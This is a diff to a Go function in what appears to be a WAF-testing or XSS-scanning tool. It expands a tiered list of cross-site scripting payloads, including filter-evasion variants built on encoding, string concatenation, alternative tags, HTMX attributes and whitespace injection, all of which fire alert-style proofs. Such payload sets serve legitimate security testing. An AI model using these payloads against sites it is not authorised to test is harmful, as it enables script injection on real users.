@@ -96,78 +96,95 @@ func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
 	} else {
 		// Default: only high-success-rate payloads
 		highRate := []string{
-			// === Basic script injection ===
+			// === Tier 1: Basic injection (most likely to work) ===
 			`<script>alert(1)</script>`,
 			`"><script>alert(1)</script>`,
 			`'><script>alert(1)</script>`,
-
-			// === Event handler injection ===
 			`<img src=x onerror=alert(1)>`,
 			`"><img src=x onerror=alert(1)>`,
 			`<svg onload=alert(1)>`,
 			`"><svg onload=alert(1)>`,
 
-			// === JavaScript context (no <> needed) ===
+			// === Tier 2: JavaScript context (no <> needed) ===
 			`alert(1)`,
 			`'-alert(1)-'`,
 			`"-alert(1)-"`,
 			`${alert(1)}`,
 			`;alert(1);`,
-			`}alert(1);{`,
+			`"-alert(1)"`,
+			`'-alert(1)'`,
 
-			// === Attribute breakout (no <> needed if already in attribute) ===
+			// === Tier 3: Attribute breakout (no <> needed) ===
 			`" onmouseover="alert(1)`,
 			`' onmouseover='alert(1)`,
 			`" autofocus onfocus="alert(1)`,
 			`" onclick="alert(1)`,
+			`" onfocus=alert(1) autofocus="`,
 
-			// === URL-based (no <> needed) ===
+			// === Tier 4: Protocol handlers ===
 			`javascript:alert(1)`,
-			`data:text/html,<script>alert(1)</script>`,
 			`javascript:void(alert(1))`,
+			`data:text/html,<script>alert(1)</script>`,
+			`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
 
-			// === WAF bypass: encoding ===
+			// === Tier 5: Encoding bypass ===
 			`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
 			`%3Cscript%3Ealert(1)%3C/script%3E`,
-			`\x3cscript\x3ealert(1)\x3c/script\x3e`,
-			`<script>alert(1)</script>`,
+			`&#60;script&#62;alert(1)&#60;/script&#62;`,
 
-			// === WAF bypass: alternative syntax ===
+			// === Tier 6: Alternative syntax ===
 			`<img/src=x/onerror=alert(1)>`,
 			`<svg/onload=alert(1)>`,
 			`<script>alert(1)//`,
-			`<script>alert(1)</script `,
 			`<ScRiPt>alert(1)</sCrIpT>`,
 			`<IMG SRC=x ONERROR=alert(1)>`,
+			`<img src=x onerror=alert(1)//`,
+			`<svg onload=alert(1)//`,
 
-			// === WAF bypass: no parentheses ===
+			// === Tier 7: Template literal (no parentheses) ===
 			"<script>alert`1`</script>",
-			`<script>alert&#40;1&#41;</script>`,
 			"<img src=x onerror=alert`1`>",
+			"<svg onload=alert`1`>",
+			`<script>alert&#40;1&#41;</script>`,
 
-			// === WAF bypass: no alert keyword ===
+			// === Tier 8: Alternative functions ===
 			`<script>confirm(1)</script>`,
 			`<script>prompt(1)</script>`,
-			`<script>console.log(1)</script>`,
 			`<img src=x onerror=confirm(1)>`,
 			`<img src=x onerror=prompt(1)>`,
+			`<svg onload=confirm(1)>`,
+			`<svg onload=prompt(1)>`,
 
-			// === WAF bypass: indirect execution (no eval/Function/setTimeout) ===
+			// === Tier 9: String concatenation (bypass keyword filter) ===
 			`<script>window['al'+'ert'](1)</script>`,
 			`<script>top['al'+'ert'](1)</script>`,
 			`<script>self['al'+'ert'](1)</script>`,
 			`<script>this['al'+'ert'](1)</script>`,
 			`<script>parent['al'+'ert'](1)</script>`,
-			`<script>frames['al'+'ert'](1)</script>`,
-			`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`,
-			`<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>`,
-			`<script>top['al'+'ert'](1)</script>`,
-			`<script>self['al'+'ert'](1)</script>`,
 			`<img src=x onerror=window['al'+'ert'](1)>`,
 			`<img src=x onerror=top['al'+'ert'](1)>`,
 			`<img src=x onerror=self['al'+'ert'](1)>`,
+			`<svg onload=window['al'+'ert'](1)>`,
+			`<svg onload=top['al'+'ert'](1)>`,
 
-			// === WAF bypass: alternative tags ===
+			// === Tier 10: Hex/Unicode encoding ===
+			`<script>window['\x61\x6c\x65\x72\x74'](1)</script>`,
+			`<script>window[String.fromCharCode(97,108,101,114,116)](1)</script>`,
+			`<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>`,
+			`<img src=x onerror=window[String.fromCharCode(97,108,101,114,116)](1)>`,
+
+			// === Tier 11: Optional chaining (modern JS) ===
+			`globalThis?.alert?.(1)`,
+			`self?.alert?.(1)`,
+			`top?.alert?.(1)`,
+			`window?.alert?.(1)`,
+
+			// === Tier 12: Array methods ===
+			`<img src=x onerror=[1].find(alert)>`,
+			`<img src=x onerror=[1].map(alert)>`,
+			`<img src=x onerror=[1].some(alert)>`,
+
+			// === Tier 13: Alternative tags ===
 			`<details open ontoggle=alert(1)>`,
 			`<body onload=alert(1)>`,
 			`<video src=x onerror=alert(1)>`,
@@ -176,8 +193,29 @@ func getTestPayloads(waf string, config *PayloadConfig, testAll bool) []string {
 			`<input onfocus=alert(1) autofocus>`,
 			`<select onchange=alert(1)><option>1</option><option>2</option></select>`,
 			`<textarea onfocus=alert(1) autofocus>`,
-			`<keygen onfocus=alert(1) autofocus>`,
-			`<isindex type=image src=x onerror=alert(1)>`,
+			`<iframe src=javascript:alert(1)>`,
+			`<object data=javascript:alert(1)>`,
+			`<embed src=javascript:alert(1)>`,
+			`<a href=javascript:alert(1)>click</a>`,
+			`<form onsubmit=alert(1)><input type=submit></form>`,
+			`<video oncanplay=alert(1)><source src=x>`,
+			`<audio onplay=alert(1)><source src=x>`,
+			`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+			`<svg><set onbegin=alert(1) attributename=x to=1>`,
+
+			// === Tier 14: Tab/newline injection ===
+			"<img src=x\tonerror=alert(1)>",
+			"<img src=x\nonerror=alert(1)>",
+			"<svg\nonload=alert(1)>",
+			"<svg\tonload=alert(1)>",
+
+			// === Tier 15: HTMX events ===
+			`<img src=x hx-on:htmx:load='alert(1)'>`,
+			`<div hx-on:click='alert(1)'>click</div>`,
+
+			// === Tier 16: Clipboard/drag events ===
+			`<input onpaste=alert(1)>`,
+			`<div draggable ondragstart=alert(1)>drag</div>`,
 		}
 		result = append(result, highRate...)
 
